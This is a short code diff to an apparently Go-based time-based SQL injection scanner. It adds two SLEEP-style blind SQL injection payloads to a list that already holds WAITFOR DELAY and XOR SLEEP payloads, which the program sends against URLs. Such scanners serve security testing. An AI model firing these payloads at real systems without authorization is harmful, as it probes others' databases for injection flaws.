@@ -117,6 +117,8 @@ func main() {
 		"';WAITFOR DELAY '0:0:tempoSQLi'--",
 		"'XOR(SELECT(0)FROM(SELECT(SLEEP(tempoSQLi)))a)XOR'Z",
 		"/'XOR(SELECT(0)FROM(SELECT(SLEEP(tempoSQLi)))a)XOR'Z",
+		"+ORDER BY SLEEP(tempoSQLi)--",
+		"') or SLEEP(tempoSQLi)--",
 	}
 
 	testarURLs(tempoSQLi, payloads)
